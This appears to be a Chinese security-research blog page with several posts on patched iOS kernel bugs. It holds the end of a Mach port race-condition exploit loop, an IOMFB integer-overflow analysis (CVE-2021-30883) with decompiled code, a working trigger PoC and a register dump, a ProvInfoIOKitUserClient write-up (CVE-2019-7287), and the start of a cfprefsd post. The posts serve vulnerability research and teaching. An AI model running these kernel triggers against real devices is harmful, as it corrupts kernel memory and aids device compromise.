=</span><br><span class="line">        mach_msg(&amp;link_sr_msg.header,</span><br><span class="line">                 MACH_SEND_MSG | MACH_SEND_OVERRIDE | MACH_SEND_SYNC_OVERRIDE |</span><br><span class="line">                     MACH_SEND_SYNC_BOOTSTRAP_CHECKIN,</span><br><span class="line">                 <span class="keyword">sizeof</span>(link_sr_msg), <span class="number">0</span>, MACH_PORT_NULL, <span class="number">0</span>, MACH_PORT_NULL);</span><br><span class="line">    <span class="comment">/*assert(kr == KERN_SUCCESS);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th_destroy</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">race_th_args_t</span> *rta = (<span class="type">race_th_args_t</span> *)arg;</span><br><span class="line">    <span class="keyword">while</span> (!rta-&gt;start);</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">2</span>);</span><br><span class="line">    mk_timer_destroy(rta-&gt;timer);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> timer = mk_timer_create();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] timer = 0x%x\n&quot;</span>, timer);</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> move_port = MACH_PORT_NULL;</span><br><span class="line">        <span class="type">kern_return_t</span> kr =</span><br><span class="line">            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;move_port);</span><br><span class="line">        assert(kr == KERN_SUCCESS);</span><br><span class="line">        kr =</span><br><span class="line">            mach_port_insert_right(mach_task_self(), move_port, move_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> sr_port = thread_get_special_reply_port();</span><br><span class="line">        <span class="comment">/*printf(&quot;[*] sr_port = 0x%x\n&quot;, sr_port);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">mach_msg_header_t</span> header;</span><br><span class="line">            <span class="type">mach_msg_body_t</span> body;</span><br><span class="line">            <span class="type">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">        &#125; move_right_msg = &#123;</span><br><span class="line">            .header =</span><br><span class="line">                &#123;</span><br><span class="line">                    .msgh_remote_port = timer,</span><br><span class="line">                    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">                    .msgh_bits =</span><br><span class="line">                        MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, <span class="number">0</span>, <span class="number">0</span>, MACH_MSGH_BITS_COMPLEX),</span><br><span class="line">                    .msgh_voucher_port = MACH_PORT_NULL,</span><br><span class="line">                    .msgh_id = <span class="number">0x88888888</span>,</span><br><span class="line">                    .msgh_size = <span class="keyword">sizeof</span>(move_right_msg),</span><br><span class="line">                &#125;,</span><br><span class="line">            .body =</span><br><span class="line">                &#123;</span><br><span class="line">                    .msgh_descriptor_count = <span class="number">1</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            .port =</span><br><span class="line">                &#123;</span><br><span class="line">                    .name = move_port,</span><br><span class="line">                    .disposition = MACH_MSG_TYPE_MOVE_RECEIVE,</span><br><span class="line">                    .type = MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">                &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        kr = mach_msg(&amp;move_right_msg.header, MACH_SEND_MSG, <span class="keyword">sizeof</span>(move_right_msg), <span class="number">0</span>,</span><br><span class="line">                      MACH_PORT_NULL, <span class="number">0</span>, MACH_PORT_NULL);</span><br><span class="line">        assert(kr == KERN_SUCCESS);</span><br><span class="line"></span><br><span class="line">        <span class="type">race_th_args_t</span> rta = &#123;</span><br><span class="line">            .start = <span class="number">0</span>,</span><br><span class="line">            .move_port = move_port,</span><br><span class="line">            .sr_port = sr_port,</span><br><span class="line">            .timer = timer,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">pthread_t</span> ths[<span class="number">2</span>];</span><br><span class="line">        pthread_create(&amp;ths[<span class="number">0</span>], <span class="literal">NULL</span>, th_send_link, &amp;rta);</span><br><span class="line">        pthread_create(&amp;ths[<span class="number">1</span>], <span class="literal">NULL</span>, th_destroy, &amp;rta);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        rta.start = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            pthread_join(ths[i], <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mach_port_destroy(mach_task_self(), timer);</span><br><span class="line">        mach_port_destroy(mach_task_self(), move_port);</span><br><span class="line">        mach_port_destroy(mach_task_self(), sr_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-31T15:47:38.000Z" title="2021/12/31 23:47:38">2021-12-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-01-09T13:45:24.577Z" title="2022/1/9 21:45:24">2022-01-09</time></span><span class="level-item">6 minutes read (About 857 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/31/iOS-IOMFB-%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">iOS IOMFB 整型溢出漏洞</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞已经在iOS15.0.2中进行了修补，漏洞编号是CVE-2021-30883。这个漏洞厉害之处在于，能够通过应用程序沙箱及其他进程访问，相当适合越狱。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://saaramar.github.io/IOMFB_integer_overflow_poc/">https://saaramar.github.io/IOMFB_integer_overflow_poc/</a></p>
</blockquote>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>漏洞出现在<em>IOMFB::TableCompensator::BilerpGainTable::new_from_data</em>函数中，a3是用户传入的一个数组，在第30行，进行下标运算时，没有进行整数溢出检查：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOMFB::TableCompensator::BilerpGainTable::<span class="built_in">new_from_data</span>(__int64 a1, __int64 a2, <span class="type">int</span> a3, __int64 *a4, _QWORD *a5, <span class="type">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v_obj; <span class="comment">// x19</span></span><br><span class="line">  __int64 v13; <span class="comment">// x8</span></span><br><span class="line">  __int64 v14; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// w8</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// w23</span></span><br><span class="line">  __int64 v17; <span class="comment">// x0</span></span><br><span class="line">  __int64 v18; <span class="comment">// x8</span></span><br><span class="line">  __int64 v_idx; <span class="comment">// x22</span></span><br><span class="line"></span><br><span class="line">  v_obj = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x60LL</span>);</span><br><span class="line">  *(_BYTE *)(v_obj + <span class="number">0x30</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v_obj = off_FFFFFFF0078EF1D8;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x58</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x50</span>) = a6;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x54</span>) = <span class="number">0</span>;</span><br><span class="line">  v13 = *a4;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x38</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x40</span>) = v13;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">0x48</span>) = *a5;</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">0x10</span>) = a3;</span><br><span class="line">  v14 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">0x140</span>);</span><br><span class="line">  *(_DWORD *)(v_obj + <span class="number">32</span>) = v14;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    v15 = a3;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = <span class="number">1</span>;</span><br><span class="line">  v16 = v15 * v14;</span><br><span class="line">  v_chunk = <span class="built_in">kalloc_ext</span>((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">12</span> * v15 * v14 + <span class="number">4</span> * (v14 + a3))); <span class="comment">// &lt;-- WOW!</span></span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">40</span>) = v_chunk;</span><br><span class="line">  v18 = v_chunk + <span class="number">12LL</span> * v16;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">24</span>) = v18;</span><br><span class="line">  *(_QWORD *)(v_obj + <span class="number">8</span>) = v18 + <span class="number">4</span> * v14;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v_idx = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( IOMFB::TableCompensator::BilerpGainTable::<span class="built_in">set_table</span>(v_obj, v_idx, a1, a2) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v_idx = (<span class="type">unsigned</span> <span class="type">int</span>)(v_idx + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v_idx &gt;= *(_DWORD *)(v_obj + <span class="number">16</span>) )</span><br><span class="line">        <span class="keyword">return</span> v_obj;</span><br><span class="line">    &#125;</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(__int64))(*(_QWORD *)v_obj + <span class="number">8LL</span>))(v_obj);</span><br><span class="line">    v_obj = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大多数操作数完全是由来自 EL0 的调用者控制的，而且计算的时候用的是32位大小：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFF0098EF290 29 17 9F 1A CSINC           W9, W25, WZR, NE</span><br><span class="line">FFFFFFF0098EF294 09 7D 09 1B MUL             W9, W8, W9</span><br><span class="line">FFFFFFF0098EF298 96 01 80 52 MOV             W22, <span class="comment">#0xC</span></span><br><span class="line">FFFFFFF0098EF29C 29 7D 16 1B MUL             W9, W9, W22</span><br><span class="line">FFFFFFF0098EF2A0 08 01 19 0B ADD             W8, W8, W25</span><br><span class="line">FFFFFFF0098EF2A4 20 09 08 0B ADD             W0, W9, W8,LSL#2</span><br><span class="line">FFFFFFF0098EF2A8 13 83 9D 97 BL              kalloc_ext</span><br></pre></td></tr></table></figure>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>漏洞存在于<em>AppleMobileDispH12P</em>中，可以从<em>AppleCLCD</em>访问。这个漏洞可以从外部方法 78 访问此函数。POC在14.7.1 和 15.0上是可行的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">io_connect_t</span> <span class="title function_">get_iomfb_uc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line">    <span class="type">io_connect_t</span> shared_user_client_conn = MACH_PORT_NULL;</span><br><span class="line">    <span class="type">int</span> type = <span class="number">0</span>;</span><br><span class="line">    <span class="type">io_service_t</span> service = IOServiceGetMatchingService(kIOMasterPortDefault,</span><br><span class="line">                                                       IOServiceMatching(<span class="string">&quot;AppleCLCD&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(service == MACH_PORT_NULL) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open service\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] AppleCLCD service: 0x%x\n&quot;</span>, service);</span><br><span class="line"></span><br><span class="line">    ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open userclient: %s\n&quot;</span>, mach_error_string(ret));</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] AppleCLCD userclient: 0x%x\n&quot;</span>, shared_user_client_conn);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> shared_user_client_conn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trigger</span><span class="params">(<span class="type">io_connect_t</span> iomfb_uc)</span> &#123;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line">    <span class="type">size_t</span> input_size = <span class="number">0x180</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> scalars[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *input = (<span class="type">char</span>*)<span class="built_in">malloc</span>(input_size);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc input&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0x41</span>, input_size);</span><br><span class="line">    *(<span class="type">int</span>*)input = <span class="number">0x3</span>;</span><br><span class="line">    </span><br><span class="line">    ret = IOConnectCallMethod(iomfb_uc, <span class="number">78</span>,</span><br><span class="line">                        scalars, <span class="number">2</span>,</span><br><span class="line">                        input, input_size,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ret != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s_set_block failed, ret == 0x%x --&gt; %s\n&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">poc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">io_connect_t</span> iomfb_uc = get_iomfb_uc();</span><br><span class="line">    <span class="keyword">if</span> (iomfb_uc == MACH_PORT_NULL) &#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    do_trigger(iomfb_uc);</span><br><span class="line">    </span><br><span class="line">    IOServiceClose(iomfb_uc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="控制操作数"><a href="#控制操作数" class="headerlink" title="控制操作数"></a>控制操作数</h2><p>这里是通过逆向<em>IOMFB::TableCompensator::BilerpGainTable::new_from_data</em>函数来实现的，将POC简单的改一下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0x0</span>, input_size);</span><br><span class="line">    <span class="type">int</span> *pArr = (<span class="type">int</span>*)input;</span><br><span class="line"></span><br><span class="line">    pArr[<span class="number">0</span>] = <span class="number">0x3</span>;          <span class="comment">// sub-sub selector</span></span><br><span class="line">    pArr[<span class="number">1</span>] = <span class="number">0xffffffff</span>;   <span class="comment">// has to be non-zero</span></span><br><span class="line">    pArr[<span class="number">2</span>] = <span class="number">0x41414141</span>;</span><br><span class="line">    pArr[<span class="number">3</span>] = <span class="number">0x42424242</span>;</span><br><span class="line">    pArr[<span class="number">8</span>] = <span class="number">0x43434343</span>;</span><br><span class="line">    pArr[<span class="number">89</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">    </span><br><span class="line">    ret = <span class="built_in">IOConnectCallMethod</span>(iomfb_uc, <span class="number">78</span>,</span><br><span class="line">                        scalars, <span class="number">2</span>,</span><br><span class="line">                        input, input_size,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>寄存器信息如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">(lldb) reg <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">        x0 = 0xffffffe4cbaa4420</span><br><span class="line">        x1 = 0x0000000000000060</span><br><span class="line">        x2 = 0x0000000000000020</span><br><span class="line">        x3 = 0x0000000000000060</span><br><span class="line">        x4 = 0x0000000000000000</span><br><span class="line">        x5 = 0x0000000043434343 // &lt;-- controlled</span><br><span class="line">        x6 = 0xfffffff00991adac</span><br><span class="line">        x7 = 0x0000000000006eb1</span><br><span class="line">        x8 = 0x0000000044444444 // &lt;-- controlled</span><br><span class="line">        x9 = 0x000000000000000b</span><br><span class="line">       x10 = 0xffffffe802224000</span><br><span class="line">       x11 = 0x3ffffff932ea900b</span><br><span class="line">       x12 = 0x0000000000000000</span><br><span class="line">       x13 = 0x00000000000001dc</span><br><span class="line">       x14 = 0x0000000000003320</span><br><span class="line">       x15 = 0x0000000000008001</span><br><span class="line">       x16 = 0xffbd7ff007a542d8</span><br><span class="line">       x17 = 0x182effe4cbaa4420</span><br><span class="line">       x18 = 0x0000000000000000</span><br><span class="line">       x19 = 0xffffffe4cbaa4420</span><br><span class="line">       x20 = 0x0000000042424242 // &lt;-- controlled</span><br><span class="line">       x21 = 0xffffffe4ccf02b00</span><br><span class="line">       x22 = 0x0000000043434343 // &lt;-- controlled</span><br><span class="line">       x23 = 0xffffffe4ccf02af4</span><br><span class="line">       x24 = 0xffffffe4ccf02aec</span><br><span class="line">       x25 = 0x0000000041414141 // &lt;-- controlled</span><br><span class="line">       x26 = 0x0000000000000000</span><br><span class="line">       x27 = 0xffffffe81869b648</span><br><span class="line">       x28 = 0xffffffe199dd5608</span><br><span class="line">       x29 = 0xffffffe81869b4b0</span><br><span class="line">       x30 = 0xfffffff0098ef23c</span><br><span class="line">        sp = 0xffffffe81869b470</span><br><span class="line">        pc = 0xfffffff0098ef290</span><br><span class="line">      cpsr = 0x20400204</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-22T13:29:49.000Z" title="2021/12/22 21:29:49">2021-12-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-31T15:29:55.924Z" title="2021/12/31 23:29:55">2021-12-31</time></span><span class="level-item">3 minutes read (About 478 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/22/iOS-ProvInfoIOKitUserClient%E6%BC%8F%E6%B4%9E/">iOS ProvInfoIOKitUserClient漏洞</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是CVE-2019-7287，已在 iOS 12.1.4 中进行了修复，这里是通过对比iOS 12.1.3 和 iOS 12.1.4 内核的差异性，来寻找漏洞点。</p>
<p>经过对比，判断漏洞点应该是在<strong>ProvInfoIOKitUserClient::ucGetEncryptedSeedSegment</strong>中，下面是iOS12.1.3中的：</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_Unfixed.png"></p>
<p>下面是iOS12.1.4中的：</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_Fixed.png"></p>
<p>可以看到加入了对a2[30]的大小的检查。</p>
<h1 id="ProvInfoIOKitUserClient"><a href="#ProvInfoIOKitUserClient" class="headerlink" title="ProvInfoIOKitUserClient"></a>ProvInfoIOKitUserClient</h1><p>IOKit 对象<strong>ProvInfoIOKit</strong>和<strong>ProvInfoIOKitUserClient</strong>在<strong>com.apple.driver.ProvInfoIOKit</strong>的驱动程序中实现。无法从运行 iOS 应用程序的普通<strong>容器</strong>沙箱，创建与驱动程序的连接。漏洞利用需要沙箱逃逸，或者，可以利用具有对该驱动程序的合法访问权限的进程。检查 iOS 12 附带的沙箱配置文件后发现，允许访问此驱动程序的三个守护进程沙箱。这些守护进程沙箱是：</p>
<ol>
<li>findmydeviced</li>
<li>mobileactivationd</li>
<li>identityserviced</li>
</ol>
<p>下一步是找出如何从外部调用此函数，此函数通过驱动程序的<strong>externalMethod</strong>接口直接暴露给用户空间。对<strong>ProvInfoIOKitUserClient::getTargetAndMethodForIndex 的</strong>检查表明驱动程序为用户空间提供了 6 种不同的外部方法。这些方法是：</p>
<ol>
<li>ucGenerateSeed（混淆名称：fpXqy2dxjQo7）</li>
<li>ucGenerateInFieldSeed（混淆名称：afpHseTGo8s）</li>
<li>ucExchangeWithHoover（混淆名称：AEWpRs）</li>
<li>ucGetEntcryptedSeedSegment</li>
<li>ucEncryptSUInfo</li>
<li>ucEncryptWithWrapperKey</li>
</ol>
<p>查看<strong>ucEncryptSUInfo</strong>和**ucEncryptWithWrapperKey **时会发现，这两个函数也被patch了，都有大小检查。</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_ucencryptsuinfo.png"></p>
<p><img src="https://www.antid0te.com/images/ProvInfo_ucencryptwithwrapperkey.png"></p>
<p>最终，在未patch之前，代码完全信任了用户传入的参数结构中的大小字段，从而导致内存损坏。</p>
<p>PZ发现的漏洞利用链中，攻击者控制<code>struct_in</code>的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ProvInfoIOKitUserClient::ucEncryptSUInfo(char* struct_in,</span><br><span class="line">                                         char* struct_out)&#123;</span><br><span class="line">  memmove(&amp;struct_out[4],</span><br><span class="line">          &amp;struct_in[4],</span><br><span class="line">          *(uint32_t*)&amp;struct_in[0x7d4]);</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-15T13:26:42.000Z" title="2021/12/15 21:26:42">2021-12-15</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-10-11T12:54:39.101Z" title="2022/10/11 20:54:39">2022-10-11</time></span><span class="level-item">19 minutes read (About 2882 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/15/Apple-cfprefsd%E6%BC%8F%E6%B4%9E/">Apple cfprefsd漏洞</a></p><div class="content"><p>本文章汇总整理一下在<strong>cfprefsd</strong>中出现的漏洞。</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="cfprefsd是什么"><a href="#cfprefsd是什么" class="headerlink" title="cfprefsd是什么"></a>cfprefsd是什么</h2><p>cfprefsd是CoreFoundation中的一个XPC服务，它能够通过用户请求读写偏好文件(即plist)。cfprefsd通常有两个运行的实例，一个负责以用户权限运行的应用程序设置首选项；另一个以root身份运行，负责系统范围的设置首选项。任何进程都可以打开与两个cfprefsd进程中的任何一个的XPC连接。</p>
<p>cfprefsd没有被沙箱隔离，因此可以从应用程序和WebContent沙箱直接访问。</p>
<p>cfprefsd二进制文件是一个Stub，主要是包含CoreFoundation框架中的CFXPreferencesDaemon_main的一个分支。CFXPreferencesDaemon_main分配一个CFPrefsDaemon对象，该对象创建一个在默认并发队列上进行监听的一个com.apple.cfprefsd.daemon（XPC服务），为每一个传入连接提供一个replyHandler来执行：</p>
